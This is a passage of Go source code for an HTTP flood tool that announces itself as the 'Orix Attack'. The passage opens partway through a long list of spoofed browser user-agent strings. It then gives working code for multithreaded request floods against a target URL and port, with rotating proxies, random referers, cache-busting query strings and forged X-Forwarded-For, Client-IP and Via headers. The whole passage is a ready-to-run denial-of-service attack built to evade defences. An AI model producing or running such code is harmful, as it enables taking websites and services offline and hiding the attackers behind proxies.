    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:95.0) Gecko/20100101 Firefox/95.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4183.174 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/721.3.41 (KHTML, like Gecko) Version/15.0 Safari/721.3.41",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.5980.122 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Edg/114.0.1694.55 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; CPH2231) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.5395.142 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Vivo V21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.5664.157 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 7; Vivo V21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.5747.109 Mobile Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/606.4.46 (KHTML, like Gecko) Version/14.0 Safari/606.4.46",
    "Mozilla/5.0 (Linux; Android 12; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.5848.117 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/868.5.26 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/868.5.26",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/837.5.11 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/837.5.11",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.5002.112 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/805.2.25 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/805.2.25",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/99.0.4196.127 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/801.5.18 (KHTML, like Gecko) Version/13.0 Mobile/15E148 Safari/801.5.18",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 13_0 like Mac OS X) AppleWebKit/869.1.26 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/869.1.26",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/789.5.18 (KHTML, like Gecko) Version/17.0 Safari/789.5.18",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/848.4.27 (KHTML, like Gecko) Version/15.0 Safari/848.4.27",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/659.1.48 (KHTML, like Gecko) Version/14.0 Safari/659.1.48",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/736.1.9 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/736.1.9",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/940.3.46 (KHTML, like Gecko) Version/14.0 Safari/940.3.46",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64) Chrome/103.0.5514.104 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/784.3.27 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/784.3.27",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64) Chrome/117.0.4940.173 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Realme 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4308.173 Mobile Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.5129.188 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/873.3.44 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/873.3.44",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.4733.178 Safari/537.36",
    "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:118.0) Gecko/20100101 Firefox/118.0",
    "Mozilla/5.0 (Linux; Android 11; Realme 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4303.106 Mobile Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/616.5.22 (KHTML, like Gecko) Version/15.0 Safari/616.5.22",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/615.1.12 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/615.1.12",
    "Mozilla/5.0 (Linux; Android 14; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4258.117 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/960.3.36 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/960.3.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0",
    "Mozilla/5.0 (Linux; Android 15; RMX3686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.5367.176 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4115.110 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64) Edg/112.0.1922.25 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/898.3.40 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/898.3.40",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/896.1.41 (KHTML, like Gecko) Version/15.0 Safari/896.1.41",
    "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0",
    "Mozilla/5.0 (Linux; Android 9; Realme 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.4754.120 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; M2012K11C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4582.194 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0",
    "Mozilla/5.0 (Linux; Android 9; Vivo V21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5724.155 Mobile Safari/537.36",
    "Mozilla/5.0 (X11; Debian; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4160.163 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/704.2.47 (KHTML, like Gecko) Version/13.0 Safari/704.2.47",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/914.5.13 (KHTML, like Gecko) Version/13.0 Mobile/15E148 Safari/914.5.13",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64) Chrome/114.0.4360.139 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/119.0.4678.133 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/82.0.4684.137 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.4483.126 Mobile Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:115.0) Gecko/20100101 Firefox/115.0",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64) Chrome/104.0.5461.197 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_8) AppleWebKit/856.1.1 (KHTML, like Gecko) Version/14.0 Safari/856.1.1",
    "Mozilla/5.0 (Linux; Android 7; CPH2231) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4151.104 Mobile Safari/537.36",
    "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:111.0) Gecko/20100101 Firefox/111.0",
    "Mozilla/5.0 (Linux; Android 14; CPH2231) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.5139.124 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5339.193 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.5092.131 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Redmi Note 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4732.103 Mobile Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_8) AppleWebKit/605.5.40 (KHTML, like Gecko) Version/17.0 Safari/605.5.40",
    "Mozilla/5.0 (Linux; Android 11; CPH2231) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4682.126 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64) Chrome/83.0.5085.120 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/824.5.31 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/824.5.31",
    "Mozilla/5.0 (Linux; Android 8; CPH2231) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.4574.176 Mobile Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5118.157 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/954.5.48 (KHTML, like Gecko) Version/14.0 Safari/954.5.48",
    "Mozilla/5.0 (Linux; Android 14; Redmi Note 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4951.189 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64) Edg/111.0.1500.186 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; RMX3686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.5532.141 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.4244.155 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/756.4.47 (KHTML, like Gecko) Version/13.0 Mobile/15E148 Safari/756.4.47",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64; rv:113.0) Gecko/20100101 Firefox/113.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/821.3.7 (KHTML, like Gecko) Version/13.0 Mobile/15E148 Safari/821.3.7",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/900.5.5 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/900.5.5",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_8) AppleWebKit/699.3.12 (KHTML, like Gecko) Version/14.0 Safari/699.3.12",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 13_0 like Mac OS X) AppleWebKit/785.4.23 (KHTML, like Gecko) Version/13.0 Mobile/15E148 Safari/785.4.23",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64) Chrome/111.0.4392.120 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; M2012K11C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.5615.131 Mobile Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_8) AppleWebKit/953.2.21 (KHTML, like Gecko) Version/16.0 Safari/953.2.21",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 13_0 like Mac OS X) AppleWebKit/609.1.13 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/609.1.13",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/851.1.2 (KHTML, like Gecko) Version/15.0 Safari/851.1.2",
    "Mozilla/5.0 (Linux; Android 8; CPH2231) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.5783.154 Mobile Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/822.1.19 (KHTML, like Gecko) Version/13.0 Safari/822.1.19",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/602.4.20 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/602.4.20",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/833.3.19 (KHTML, like Gecko) Version/16.0 Safari/833.3.19",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/828.4.47 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/828.4.47",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/95.0.5798.196 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/894.4.3 (KHTML, like Gecko) Version/16.0 Safari/894.4.3",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_8) AppleWebKit/644.1.8 (KHTML, like Gecko) Version/16.0 Safari/644.1.8",
    "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/975.5.10 (KHTML, like Gecko) Version/14.0 Safari/975.5.10",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/970.1.34 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/970.1.34",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/887.2.16 (KHTML, like Gecko) Version/13.0 Mobile/15E148 Safari/887.2.16",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/756.3.6 (KHTML, like Gecko) Version/15.0 Safari/756.3.6",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/813.4.39 (KHTML, like Gecko) Version/16.0 Safari/813.4.39",
}

func getRandomUA() string {
	return userAgents[rand.Intn(len(userAgents))]
}

// Random Referer
func randomReferer() string {
	sites := []string{
		"https://google.com",
		"https://facebook.com",
		"https://youtube.com",
		"https://bing.com",
		"https://twitter.com",
	}
	return sites[rand.Intn(len(sites))]
}

// Load proxy list (optional)
func loadProxies(file string) {
	f, err := os.Open(file)
	if err != nil {
		return
	}
	defer f.Close()
	scanner := bufio.NewScanner(f)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" {
			proxies = append(proxies, line)
		}
	}
}

// Get TCP connection (direct or via proxy)
func getConn(addr string) (net.Conn, error) {
	if len(proxies) > 0 {
		proxy := proxies[rand.Intn(len(proxies))]
		conn, err := net.Dial("tcp", proxy)
		if err != nil {
			return nil, err
		}
		connectReq := fmt.Sprintf("CONNECT %s HTTP/1.1\r\nHost: %s\r\n\r\n", addr, host)
		_, err = conn.Write([]byte(connectReq))
		if err != nil {
			return nil, err
		}
		return conn, nil
	}
	return net.Dial("tcp", addr)
}

func flood(requestsPerConn int) {
	addr := host + ":" + port
	<-start
	for {
		s, err := getConn(addr)
		if err != nil {
			atomic.AddUint64(&errCount, 1)
			continue
		}
		for i := 0; i < requestsPerConn; i++ {
			ip := randomIP()
			req := fmt.Sprintf("%s %s%s%d HTTP/1.1\r\n", method, page, key, rand.Intn(99999999))
			req += fmt.Sprintf("Host: %s\r\n", host)
			req += fmt.Sprintf("User-Agent: %s\r\n", getRandomUA())
			req += fmt.Sprintf("Referer: %s\r\n", randomReferer())
			req += fmt.Sprintf("Accept-Language: en-US,en;q=0.9\r\n")
			req += fmt.Sprintf("X-Forwarded-For: %s\r\n", ip)
			req += fmt.Sprintf("Client-IP: %s\r\n", randomIP())
			req += fmt.Sprintf("Via: %s\r\n", randomIP())
			req += "Connection: Keep-Alive\r\n\r\n"

			_, err := s.Write([]byte(req))
			if err != nil {
				atomic.AddUint64(&errCount, 1)
			} else {
				atomic.AddUint64(&sentCount, 1)
			}
		}
		s.Close()
	}
}

func main() {
	if len(os.Args) < 7 {
		fmt.Println("Usage:", os.Args[0], "python3 doom-cannon.py")
		os.Exit(1)
	}

	u, _ := url.Parse(os.Args[1])
	host = strings.Split(u.Host, ":")[0]
	page = u.Path
	if page == "" {
		page = "/"
	}
	method = strings.ToUpper(os.Args[3])
	threads, _ := strconv.Atoi(os.Args[2])
	limit, _ := strconv.Atoi(os.Args[4])
	port = os.Args[6]

	if os.Args[5] != "nil" {
		loadProxies(os.Args[5])
	}

	if strings.Contains(page, "?") {
		key = "&"
	} else {
		key = "?"
	}

	fmt.Println("\n**------ Orix Attack Started --------**")
	fmt.Printf("\n%-6s of max %-6s |\t%7s |\t%6s\n", "Cur", "Threads", "Sent", "Error")

	requestsPerConn := 1000

	for i := 0; i < threads; i++ {
		go flood(requestsPerConn)
		fmt.Printf("\r%-6d of max %-6d |\t%7d |\t%6d", i+1, threads, 0, 0)
	}

	go func() {
		for {
			fmt.Printf("\r%-6d of max %-6d |\t%7d |\t%6d",
				threads, threads, atomic.LoadUint64(&sentCount), atomic.LoadUint64(&errCount))
			time.Sleep(time.Second / 2)
		}
	}()

	close(start)
	time.Sleep(time.Duration(limit) * time.Second)
}
